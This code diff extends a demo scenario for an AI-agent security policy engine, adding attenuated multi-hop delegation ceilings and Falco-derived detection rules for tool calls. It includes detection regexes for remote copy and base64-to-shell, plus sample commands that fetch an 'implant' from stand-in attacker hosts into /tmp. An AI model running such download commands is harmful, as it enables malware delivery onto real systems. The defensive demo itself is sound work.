@@ -35,9 +35,10 @@ const L_CONFIDENTIAL  = { confidentiality: 32768, integrity: 16384, categories: 
 const L_RESTRICTED    = { confidentiality: 49152, integrity: 32768, categories: 7 };  // credentials|finance|pii
 
 // ── Session IDs ───────────────────────────────────────────────────────────────
-const SESS_MAIN      = 'sess_7f3a91bc'; // primary agent — starts Unclassified
-const SESS_DELEGATE  = 'sess_2e8c04d1'; // delegated sub-agent — ceiling: Internal
-const SESS_OPERATOR  = 'sess_b5f60a2e'; // operator review session — Restricted
+const SESS_MAIN        = 'sess_7f3a91bc'; // primary agent — starts Unclassified, escalates to Restricted
+const SESS_DELEGATE    = 'sess_2e8c04d1'; // hop-1: SESS_MAIN delegates → ceiling: Internal (attenuated from Restricted)
+const SESS_SUBDELEGATE = 'sess_cc9f3a01'; // hop-2: SESS_DELEGATE delegates further → ceiling: Unclassified (attenuated again)
+const SESS_OPERATOR    = 'sess_b5f60a2e'; // operator review session — Restricted
 
 // ── Policy definitions ────────────────────────────────────────────────────────
 const POLICIES = [
@@ -123,7 +124,7 @@ const IMPORTED_POLICIES = [
   { id: 'falco-launch-remote-file-copy-tools-in-container',
     cel: 'tool == "Bash" && request.args.command.matches("(scp|rsync)\\\\s+.*@.*:.*")' },
   { id: 'falco-launch-ingress-remote-file-copy-tools-in-container',
-    cel: 'tool == "Bash" && request.args.command.matches("(wget|curl\\\\s+-O)\\\\s+http.*")' },
+    cel: 'tool == "Bash" && request.args.command.matches(".*(curl|wget).*-[oO]\\\\s+/tmp/.*")' },
   { id: 'falco-decoding-payload-in-container',
     cel: 'tool == "Bash" && request.args.command.matches("base64\\\\s+-d.*\\\\|\\\\s*sh.*")' },
   { id: 'falco-drop-and-execute-new-binary-in-container',
@@ -714,18 +715,35 @@ export function buildDemoScenario(): DemoStep[] {
       }),
     },
 
-    // ── 25.2s: Delegation created — main → sub-agent at Internal ─────────────
+    // ── 25.2s: Hop 1 — SESS_MAIN (Restricted) delegates to SESS_DELEGATE (ceiling: Internal)
+    //   Attenuation: Restricted → Internal (cannot access Confidential or above)
     {
       delayMs: 1000,
       json: ce('delegation.created', {
         session_id: SESS_DELEGATE,
         delegator_id: SESS_MAIN,
         delegatee_id: SESS_DELEGATE,
-        granted_label: L_INTERNAL,
-        ceiling_label: L_INTERNAL,
+        granted_label: L_RESTRICTED,    // parent's current label
+        ceiling_label: L_INTERNAL,      // attenuated: sub-agent capped at Internal
         capabilities: ['Read', 'Write', 'Bash', 'WebSearch'],
         expires_at: Date.now() + 30_000,
-        reason: 'Sub-agent granted Internal capability for file processing task',
+        reason: 'Sub-agent granted Internal capability for file processing — cannot access Confidential data',
+      }),
+    },
+
+    // ── 25.6s: Hop 2 — SESS_DELEGATE (Internal) sub-delegates to SESS_SUBDELEGATE (ceiling: Unclassified)
+    //   Second attenuation: Internal → Unclassified (read-only, no sensitive data)
+    {
+      delayMs: 400,
+      json: ce('delegation.created', {
+        session_id: SESS_SUBDELEGATE,
+        delegator_id: SESS_DELEGATE,
+        delegatee_id: SESS_SUBDELEGATE,
+        granted_label: L_INTERNAL,       // delegator's ceiling
+        ceiling_label: L_UNCLASSIFIED,   // attenuated again: only public data
+        capabilities: ['Read', 'WebSearch'],
+        expires_at: Date.now() + 20_000,
+        reason: 'Read-only sub-agent for public data lookup — Unclassified ceiling only',
       }),
     },
 
@@ -743,17 +761,49 @@ export function buildDemoScenario(): DemoStep[] {
       }),
     },
 
-    // ── 27.0s: Delegate — Read safe file (allow) ─────────────────────────────
+    // ── 27.0s: Sub-delegate reads public data (allow — within Unclassified ceiling)
     {
       delayMs: 800,
       json: policyEval({
         tool: 'Read',
+        sessionId: SESS_SUBDELEGATE,
+        action: 'allow',
+        label: L_UNCLASSIFIED,
+        layer: 'delegation',
+        latencyNs: 48_000,
+        requestArgs: '/public/docs/api-reference.md',
+      }),
+    },
+
+    // ── 27.6s: Sub-delegate tries to read internal file — DENY (exceeds ceiling)
+    {
+      delayMs: 600,
+      json: policyEval({
+        tool: 'Read',
+        sessionId: SESS_SUBDELEGATE,
+        action: 'deny',
+        reason: 'Delegation ceiling exceeded: session ceiling is Unclassified, resource requires Internal',
+        policyId: 'aegis/delegate-ceiling',
+        cel: 'delegation.ceiling.confidentiality >= resource.classification.confidentiality',
+        label: L_UNCLASSIFIED,
+        layer: 'delegation',
+        latencyNs: 91_000,
+        requestArgs: '/internal/reports/q4-financials.pdf',
+      }),
+    },
+
+    // ── 27.8s: Delegate hop-1 reads same file — ALLOW (Internal ceiling allows it)
+    {
+      delayMs: 200,
+      json: policyEval({
+        tool: 'Read',
         sessionId: SESS_DELEGATE,
         action: 'allow',
+        policyId: 'aegis/delegate-ceiling',
         label: L_INTERNAL,
         layer: 'delegation',
         latencyNs: 54_000,
-        requestArgs: '/home/user/project/data.json',
+        requestArgs: '/internal/reports/q4-financials.pdf',
       }),
     },
 
@@ -774,20 +824,20 @@ export function buildDemoScenario(): DemoStep[] {
       }),
     },
 
-    // ── 28.6s: EXFILTRATION — wget malware DENY ──────────────────────────────
+    // ── 28.6s: EXFILTRATION — binary downloaded to /tmp AUDIT ───────────────
     {
       delayMs: 800,
       json: policyEval({
         tool: 'Bash',
         sessionId: SESS_MAIN,
-        action: 'deny',
-        reason: 'Falco: downloading remote payloads is the first step in malware delivery',
+        action: 'audit',
+        reason: 'Falco: binary written directly to /tmp — common first stage of payload delivery; auditing for investigation (legitimate installs also match this pattern)',
         policyId: 'falco-launch-ingress-remote-file-copy-tools-in-container',
-        cel: 'tool == "Bash" && request.args.command.matches("(wget|curl\\s+-O)\\s+http.*")',
+        cel: 'tool == "Bash" && request.args.command.matches(".*(curl|wget).*-[oO]\\s+/tmp/.*")',
         label: L_RESTRICTED,
         labelState: 'tainted_by_secret',
         latencyNs: 251_000,
-        requestArgs: 'wget http://malware.com/payload -O /tmp/malware',
+        requestArgs: 'curl -fsSL https://dl.attacker.io/implant -o /tmp/.update',
       }),
     },
 
